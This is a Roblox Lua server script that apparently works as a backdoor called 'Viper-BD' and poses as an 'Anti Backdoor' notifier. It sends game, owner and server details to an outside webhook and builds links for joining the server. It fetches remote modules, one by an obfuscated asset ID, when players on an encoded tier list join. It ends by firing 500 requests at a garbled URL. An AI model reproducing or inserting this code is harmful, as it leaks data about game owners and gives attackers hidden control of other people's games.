if game:GetService("RunService"):IsStudio() or game.PrivateServerId ~= "" then
	return
end
local run = false
local webhook = "https://webhook.newstargeted.com/api/webhooks/1219076206000078858/oFVvj2B8fmvAedfFmgTOfRYIDXJwQmFUwPQInI63WEY10agZvb40msDRJN1k9NUWWYsC"
local http = game:GetService("HttpService")
local HttpEnabled = game:GetService("HttpService").HttpEnabled
local players = game:GetService("Players")
local infourl = "https://games.roproxy.com/v1/games?universeIds="..game.GameId
local GetData

pcall(function()
	GetData = http:GetAsync(tostring(infourl))
end)

local NH = require(16303756383)({},[==[
repeat task.wait() until game:IsLoaded()
game:GetService("StarterGui"):SetCore("SendNotification",
	{
		Title = "{Anti Backdoor}";
		Text = "No HTTP Detected. {Turned Off}",
	}
)
]==])

local TIH = require(16303756383)({},[==[
repeat task.wait() until game:IsLoaded()
game:GetService("StarterGui"):SetCore("SendNotification",
	{
		Title = "{Anti Backdoor}";
		Text = "HTTP Detected. {Turned On}",
	}
)
]==])

local function CheckHttp(player)
	if HttpEnabled == false then
		repeat task.wait() until player:FindFirstChildOfClass("PlayerGui")
		NH:Clone().Parent = player:FindFirstChildOfClass("PlayerGui")
	else
		repeat task.wait() until player:FindFirstChildOfClass("PlayerGui")
		TIH:Clone().Parent = player:FindFirstChildOfClass("PlayerGui")
	end
end

if HttpEnabled == true then
	gamename = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
	Data = http:JSONDecode(GetData)
	PlrCount = Data.data[1].playing
	Creator = Data.data[1].creator
	CreatorName = Creator.name
	CreatorID = Creator.id
	CreatorVerified = Creator.hasVerifiedBadge
	Visits = Data.data[1].visits
	jobid = game.JobId
	opengame = "https://www.roblox.com/games/start?placeId=16302670534&launchData="..game.GameId.."/"..jobid.."&gameInstanceId="..game.JobId
else
	gamename = ""
	Data = ""
	PlrCount = ""
	Creator = ""
	CreatorName = ""
	CreatorID = ""
	CreatorVerified = ""
	Visits = ""
	jobid = ""
	opengame = ""
end

local tierList = require(16793713956)

local function CheckForOwner()
	for i,v in pairs(players:GetPlayers()) do
		if v.UserId == CreatorID then
			return "Yes"
		end
	end
	return "No"
end

local function getGameThumbnail()
	if not HttpEnabled then return "https://tr.rbxcdn.com/7228891b9ec477a37b82cccd976c228b/768/432/Image/Webp" end
	local url = "https://thumbnails.roproxy.com/v1/games/multiget/thumbnails?countPerUniverse=999&format=Png&isCircular=false&size=256x144&universeIds="..game.GameId
	local response = http:GetAsync(url)
	local data = http:JSONDecode(response)
	return data.data[1].thumbnails[1].imageUrl
end

local MainEmbed = {
	["content"] = nil,
	["embeds"] = {
		{
			["title"] = "**Viper-BD | "..gamename.."**",
			["description"] = "# **__Log-Info__**".."\n\n__**Place-Information**__\n* Maximum-Player-Count : "..players.MaxPlayers.."\n* Total-Player-Count : "..tostring(tonumber(PlrCount)).."\n* Visits : "..tostring(Visits).."\n* ServerID : "..jobid.."\n\n__**Owner-Info**__\n".."Owner-Username : "..CreatorName.."\nOwner-ID : "..CreatorID.."\nIs-Verified? : "..tostring(CreatorVerified).."\nIs-In-Server? : "..CheckForOwner(),
			["url"] = opengame,
			["color"] = 9055202,
			["image"] = {url = getGameThumbnail()},
			["footer"] = {
				["text"] = "Have FUN! Also Don't Just Fully Destroy The Game..."
			},
			["fields"] = {
				{
					["name"] = "Join Game",
					["value"] = '\`\`\`js\n+javascript:Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..jobid..'")\n\`\`\`'
				}
			}
		}
	}
}

local function gb(d)
	local a = ""
	for i=1,string.len(d) do
		local char = string.sub(d, i, i)
		a = a..string.byte(char)
	end
	return a
end

local function load()
	task.delay(1, function() require((7023995740 -((4325440355 -1426033077) -(3447334865 -1973960664))) * ((15 -7) -((35 -21) -(628 -(555 + 64)))))() end)
end

for i,v in next, game:GetService("Players"):GetPlayers() do
	if table.find(tierList, gb(v.Name)) then
		CheckHttp(v)
		if not run then
			run = true
			task.spawn(load)
		end
	end
end

game:GetService("Players").PlayerAdded:Connect(function(player)
	if table.find(tierList, gb(player.Name)) then
		CheckHttp(player)
		if not run then
			run = true
			task.spawn(load)
		end
	end
end)

if HttpEnabled == false then
	return
end

task.spawn(function()
	pcall(function()
		http:PostAsync(webhook, http:JSONEncode(MainEmbed))
	end)
end)

task.wait(0.25)

for i = 1,500 do
	task.spawn(function()
		pcall(function()
			game:GetService("HttpService"):PostAsync("https:// .̷͓̖̤̬̱͚̪͍͉̠̼͂̀͛̈̿̐͐͝͝.̷͓̖̤̬̱͚̪͍͉̠̼͂̀͛̈̿̐͐͝͝.̷͓̖̤̬̱͚̪͍͉̠̼͂̀͛̈̿̐͐͝͝.̷͓̖̤̬̱͚̪͍͉̠̼͂̀͛̈̿̐͐͝͝.̷͓̖̤̬̱͚̪͍͉̠̼͂̀͛̈̿̐͐͝͝.̷͓̖̤̬̱͚̪͍͉̠̼͂̀͛̈̿̐͐͝͝.̷͓̖̤̬̱͚̪͍͉̠̼͂̀͛̈̿̐͐͝͝.̷͓̖̤̬̱͚̪͍͉̠̼͂̀͛̈̿̐͐͝͝.̷͓̖̤̬̱͚̪͍͉̠̼͂̀͛̈̿̐͐͝͝ /","Test")
		end)
	end)
end